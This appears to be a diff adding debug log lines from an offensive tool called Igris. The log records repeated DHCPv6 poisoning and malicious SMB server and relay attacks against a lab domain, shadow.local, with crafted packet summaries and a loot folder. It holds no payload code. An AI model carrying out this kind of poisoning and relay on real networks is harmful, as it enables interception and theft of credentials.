+2021-12-30 15:36:05.914 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:36:07.973 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:36:07.973 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:36:07.973 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:36:08.013 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:36:08.013 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:36:09.009 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:36:09.010 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:36:11.006 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:36:11.006 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:36:15.015 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:36:15.016 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:36:18.774 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:36:54.568 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 15:36:54.569 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 15:36:54.572 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 15:36:54.579 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:154 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 15:36:54.580 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 15:36:54.586 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 15:36:54.593 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 15:36:54.594 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 15:37:10.392 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:37:10.392 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:37:10.392 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:37:11.391 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:37:11.391 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:37:11.837 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:37:11.837 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:37:12.864 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:37:12.864 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:37:14.869 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:37:14.870 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:37:14.870 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:37:14.911 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:37:14.911 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:37:15.895 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:37:15.896 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:37:17.830 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:38:16.198 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 15:38:16.201 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 15:38:16.209 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 15:38:16.228 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:154 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 15:38:16.230 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 15:38:16.239 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 15:38:16.242 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 15:38:16.247 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 15:38:32.519 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:38:32.520 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:38:32.520 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:38:33.525 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:38:33.525 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:38:34.003 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:38:34.004 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:38:35.040 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:38:35.040 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:38:37.030 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:38:37.031 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:38:37.031 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:110 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:38:37.070 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:38:37.070 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:38:38.045 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:38:38.045 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:38:40.053 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - Packet crafted: 
+2021-12-30 15:38:40.054 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:107 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:38:40.130 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:51:13.741 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 15:51:13.741 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 15:51:13.743 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 15:51:13.748 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:152 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 15:51:13.748 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 15:51:13.751 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 15:51:13.752 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 15:51:13.753 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 15:51:39.190 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 15:51:39.191 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:51:39.191 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:51:40.208 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 15:51:40.209 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:51:40.927 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 15:51:40.928 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:51:41.988 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 15:51:41.988 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:51:43.998 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 15:51:43.999 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:51:43.999 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:51:44.039 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 15:51:44.039 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:51:45.010 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 15:51:45.011 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:51:47.027 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 15:51:47.027 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:51:51.025 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 15:51:51.026 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:51:59.032 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 15:51:59.032 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:51:59.033 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:113 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:53:09.218 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:54:55.576 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 15:54:55.579 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 15:54:55.585 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 15:54:55.599 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:149 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 15:54:55.602 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 15:54:55.615 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 15:54:55.623 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 15:54:55.626 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 15:55:33.869 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:102 - Packet crafted: 
+2021-12-30 15:55:33.871 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:103 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:55:33.871 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:106 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:55:34.878 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:102 - Packet crafted: 
+2021-12-30 15:55:34.880 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:103 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:55:35.871 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:102 - Packet crafted: 
+2021-12-30 15:55:35.872 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:103 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 15:55:35.872 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:111 - [36m(DHCP6) Sending dhcp6 REPLY packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 15:56:17.678 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 15:59:09.869 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:01:15.987 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:01:15.988 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:01:15.991 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 16:01:15.995 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 16:01:15.998 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 16:01:15.998 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 16:01:15.999 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 16:01:37.790 | WARNING  | project.mitm.mss:__synchronous_attack:100 - Exiting smb relay attack ...
+2021-12-30 16:01:43.650 | DEBUG    | project.mitm.mss:do_mss:266 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2021-12-30 16:01:43.651 | DEBUG    | project.igris:check_settable_variables_value:195 - Checking the correct value of the necessary settable variables 
+2021-12-30 16:01:43.659 | INFO     | project.mitm.mss:__launching_attack:109 - Running mss the results will be saved in : /home/rsgbengi/Igris/loot
+2021-12-30 16:01:43.673 | INFO     | project.mitm.poison.poisoners.dhcp6:start_dhcp6_poisoning:151 - Starting dhcp6 poisoning to attack shadow.local.
+2021-12-30 16:01:43.674 | INFO     | project.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2021-12-30 16:01:43.681 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2021-12-30 16:01:43.682 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2021-12-30 16:01:43.685 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2021-12-30 16:02:01.286 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 16:02:01.287 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:02:01.287 | INFO     | project.mitm.poison.poisoners.dhcp6:__send_packet:108 - [36m(DHCP6) Sending dhcp6 ADVERTISE packet to fe80::11cd:3852:b2df:f387[0m
+2021-12-30 16:02:02.292 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 16:02:02.293 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Reply / DHCP6OptServerId / DHCP6OptClientId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:02:03.198 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 16:02:03.199 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
+2021-12-30 16:02:04.226 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:104 - Packet crafted: 
+2021-12-30 16:02:04.226 | DEBUG    | project.mitm.poison.poisoners.dhcp6:__send_packet:105 - Ether / IPv6 / UDP fe80::20c:29ff:fe0e:d73b:dhcpv6_server > fe80::11cd:3852:b2df:f387:dhcpv6_client / DHCP6_Advertise / DHCP6OptClientId / DHCP6OptServerId / DHCP6OptDNSServers / DHCP6OptDNSDomains / DHCP6OptIA_NA
